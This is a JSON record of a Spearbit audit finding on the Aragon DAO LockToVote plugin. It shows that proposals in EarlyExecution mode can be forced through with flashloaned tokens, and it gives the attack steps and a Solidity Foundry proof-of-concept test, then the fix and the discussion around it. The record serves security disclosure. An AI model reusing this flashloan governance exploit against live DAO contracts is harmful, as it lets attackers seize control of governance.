{
    "id": 62256,
    "kind": "PDF",
    "auditfirm_id": 6,
    "impact": "HIGH",
    "finders_count": 3,
    "protocol_id": 3395,
    "title": "Proposals created with voting mode EarlyExecution are vulnerable to ï¬‚ashloan attacks",
    "content": "## Severity: High Risk\n\n## Context\n(No context files were provided by the reviewer)\n\n## Description\nIf the token used by the LockManager can be flashloaned (or flashminted) and a proposal is created with the voting mode `EarlyExecution`, anyone could be able to \"early execute\" it performing the following actions:\n\n- Flashloan the needed amount.\n- Lock the flashloaned amount.\n- Cast a \"YES\" vote and trigger the \"early execute\" logic.\n- Unlock the tokens.\n- Repay the flashloan.\n\n## Proof of Concept\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport {TestBase} from \"./lib/TestBase.sol\";\nimport {DaoBuilder} from \"./builders/DaoBuilder.sol\";\nimport {DAO} from \"@aragon/osx/src/core/dao/DAO.sol\";\nimport {Action} from \"@aragon/osx-commons-contracts/src/executors/IExecutor.sol\";\nimport {LockToVotePlugin, MajorityVotingBase} from \"../src/LockToVotePlugin.sol\";\nimport {IMajorityVoting} from \"../src/interfaces/IMajorityVoting.sol\";\nimport {LockManagerERC20} from \"../src/LockManagerERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {TestToken} from \"./mocks/TestToken.sol\";\nimport \"forge-std/console.sol\";\n\ncontract SVoteFlashloanTest is TestBase {\n    DaoBuilder builder;\n    DAO dao;\n    LockToVotePlugin ltvPlugin;\n    LockManagerERC20 lockManager;\n    IERC20 lockableToken;\n    uint256 proposalId;\n    \n    // Default actions for proposal creation\n    Action[] internal actions;\n\n    event ProposalExecuted(uint256 indexed proposalId);\n\n    function setUp() public {}\n\n    function _init(MajorityVotingBase.VotingMode _votingMode) internal {\n        builder = new DaoBuilder();\n        (dao, ltvPlugin, lockManager, lockableToken) = builder.withVotingPlugin().withVotingMode(_votingMode).build();\n    }\n\n    function testFlashLoanVote() public {\n        _init(MajorityVotingBase.VotingMode.EarlyExecution);\n        \n        // give alice the proposer permission to make it simple\n        dao.grant(address(ltvPlugin), alice, ltvPlugin.CREATE_PROPOSAL_PERMISSION_ID());\n        \n        // NOTE: I need to provide the permission to the LockManager instead of Alice because\n        // /grave.ts1vote/grave.ts1is passing /grave.ts1msg.sender/grave.ts1(the lock manager) to /grave.ts1_attemptEarlyExecution/grave.ts1instead of the actual voter address\n        dao.grant(address(ltvPlugin), address(lockManager), ltvPlugin.EXECUTE_PROPOSAL_PERMISSION_ID());\n        \n        vm.prank(alice);\n        proposalId = ltvPlugin.createProposal(\"0x\", new Action[](0), 0, 0, abi.encode(uint256(0)));\n        \n        // flashloan to alice just enough token to make the proposal pass and execute it\n        _flashloan(address(lockableToken), alice, 10e18);\n        \n        // approve the token to be locked\n        vm.prank(alice);\n        lockableToken.approve(address(lockManager), 10e18);\n        \n        // lock and vote the Yes\n        // check that the proposal has been executed by expecting the /grave.ts1ProposalExecuted/grave.ts1event\n        vm.expectEmit();\n        emit ProposalExecuted(proposalId);\n        vm.prank(alice);\n        lockManager.lockAndVote(proposalId, IMajorityVoting.VoteOption.Yes, 10e18);\n        \n        // alice has not more token, everything has been temporarily locked in the lock manager\n        assertEq(lockableToken.balanceOf(alice), 0);\n        \n        // alice can unlock and withdraw everything because the proposal has been auto-executed by her vote\n        vm.prank(alice);\n        lockManager.unlock();\n        \n        // alice got all her 10e18 token back and can repay the 1000 token flashloan\n        assertEq(lockableToken.balanceOf(alice), 10e18);\n    }\n\n    function _flashloan(address token, address user, uint256 amount) internal {\n        TestToken(token).mint(user, amount);\n    }\n}\n```\n\n## Recommendation\nOne possible path to be further evaluated is to avoid allowing the early execution in the very same block that the vote has been made. This would require tracking the \"success\" of a proposal in a separate flag, stored in the proposal struct.\n\nIf the flag is true (or the voting period has ended and the existing success logic passes), the proposal can be executed. This new flag and block requirement needs to be integrated across the existing logic in all the functions like `canVote`, `canExecute`, `hasSucceeded`, `_isProposalOpen`, and so on.\n\nNote that these are suggestions that could lead to side effects and need to be further properly evaluated from a security standpoint.\n\n## Aragon\nFixed in PR 26.\n\n## Spearbit\nThe issue has been resolved with the PR 26.\n\nAs previously mentioned, by removing the `EarlyExecution` voting mode, users won't be able to \"withdraw\" their vote and unlock them before all the proposals they have voted in have ended (voting period has ended). This is not a \"security issue\" because it follows the intended behavior of the \"Standard Voting Mode\", but it could create a UX issue because no one will be willing to vote on multiple proposals or will \"wait\" until the very end of the proposal voting period to lock their token only for the smallest amount of time (just to make a couple of examples).\n\nUnless tokens are valueless (can't be traded), users could want to avoid locking their token and losing money. This will lead, as explained above, to voting behaviors that will make the proposal experience quite worse.\n\n## Aragon Feedback\nAgree with your feedback. However, the early execution mode was something we inherited from our existing plugins and in this context we see it more as a risk than as an asset. Even if the UX is impacted, and even if there could be a way to execute on the next block, we prefer being extra safe here. As mentioned, the likelihood of early execution is very, very low from our experience. So the impact of removing this mode should be close to nothing.\n\n- We are removing the lingering appearances of \"early\" that weren't removed yet.\n- We are going ahead with the PR that you verified.\n- We acknowledge the feedback regarding the UX degradation.",
    "summary": "\nThis bug report discusses a high-risk issue related to the LockManager token used by the Aragon platform. The issue allows anyone to \"early execute\" a proposal in the voting mode `EarlyExecution` by performing a series of actions. The report includes a proof of concept code and recommends a possible solution to prevent this issue from occurring. The Aragon team has fixed the issue in their PR 26 and acknowledges the potential impact on user experience. They are moving forward with the fix and acknowledge the feedback regarding the potential degradation of user experience.",
    "report_date": "2025-08-28T00:00:00.000Z",
    "contest_prize_txt": "",
    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Aragon-Spearbit-Security-Review-July-2025.pdf",
    "sponsor_name": null,
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Aragon-Spearbit-Security-Review-July-2025.pdf",
    "github_link": "",
    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Aragon-Spearbit-Security-Review-July-2025.pdf",
    "pdf_page_from": 6,
    "contest_id": "",
    "slug": "proposals-created-with-voting-mode-earlyexecution-are-vulnerable-to-flashloan-attacks-spearbit-none-aragon-dao-gov-plugin-pdf",
    "firm_name": "Spearbit",
    "firm_logo_square": "spearbit_square.png",
    "protocol_name": "Aragon DAO Gov Plugin",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "Om Parikh"
            }
        },
        {
            "wardens_warden": {
                "handle": "Emanuelle Ricci"
            }
        },
        {
            "wardens_warden": {
                "handle": "Patrick Drotleff"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
    },
    "protocols_protocol": {
        "name": "Aragon DAO Gov Plugin",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}